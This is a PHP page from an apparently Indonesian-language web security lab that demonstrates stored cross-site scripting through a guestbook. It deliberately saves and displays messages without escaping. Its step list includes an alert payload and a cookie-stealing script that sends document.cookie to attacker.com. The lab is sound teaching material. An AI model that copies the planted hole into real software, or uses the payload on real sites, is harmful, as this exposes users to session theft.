<?php
session_start();
$base_path = '../../';
include '../../db.php';

// Stored XSS Database Setup (Lazy init for demo)
$conn->query("CREATE TABLE IF NOT EXISTS guestbook (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(50),
    message TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)");

// Handle Post
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['message'])) {
    $name = $_SESSION['username'];
    $message = $_POST['message'];
    
    // VULNERABLE: No htmlspecialchars() on SAVE or DISPLAY
    $stmt = $conn->prepare("INSERT INTO guestbook (name, message) VALUES (?, ?)");
    $stmt->bind_param("ss", $name, $message);
    $stmt->execute();
}

// Clear chat
if (isset($_GET['clear'])) {
    $conn->query("TRUNCATE TABLE guestbook");
    header("Location: stored.php");
    exit;
}

include '../../includes/header.php';
?>

<div class="card">
    <div class="module-header" style="background: linear-gradient(135deg, #f59e0b, #d97706);">
        <h1>📢 Stored XSS (Guestbook)</h1>
        <p>XSS Tipe 2: Script berbahaya <strong>tersimpan permanen</strong> di database server.</p>
    </div>

    <div class="alert alert-info">
        <strong>📚 Langkah Percobaan:</strong>
        <ol style="margin-left: 1.5rem; margin-top: 0.5rem;">
            <li>Tulis pesan biasa: "Halo dunia".</li>
            <li>Tulis script: <code>&lt;script&gt;alert('Hacked')&lt;/script&gt;</code> dan Kirim.</li>
            <li>Setiap kali halaman ini direfresh atau dibuka user lain, alert akan muncul.</li>
            <li>Bayangkan jika scriptnya mencuri Cookies: <code>&lt;script&gt;window.location='http://attacker.com?cookie='+document.cookie&lt;/script&gt;</code>.</li>
        </ol>
        <a href="stored.php?clear=1" class="btn btn-sm btn-secondary" style="margin-top:0.5rem;">🗑️ Bersihkan Guestbook</a>
    </div>

    <div class="grid-2">
        <!-- Form -->
        <div>
            <h3>✍️ Tulis Pesan</h3>
            <form method="POST">
                <textarea name="message" placeholder="Tulis sesuatu..." rows="4" required style="width:100%"></textarea>
                <button type="submit" class="btn">Kirim Pesan</button>
            </form>
        </div>

        <!-- Display -->
        <div style="max-height: 400px; overflow-y: auto; background: #fff; padding: 1rem; border: 1px solid #ddd;">
            <h3>💬 Komentar Terbaru</h3>
            <?php
            $result = $conn->query("SELECT * FROM guestbook ORDER BY id DESC");
            while ($row = $result->fetch_assoc()) {
                echo "<div style='border-bottom:1px solid #eee; padding: 0.5rem 0;'>";
                echo "<strong>" . htmlspecialchars($row['name']) . ":</strong><br>";
                echo $row['message']; // VULNERABLE INPUT
                echo "<br><small style='color:gray'>" . $row['created_at'] . "</small>";
                echo "</div>";
            }
            ?>
        </div>
    </div>
</div>

<?php include '../../includes/footer.php'; ?>
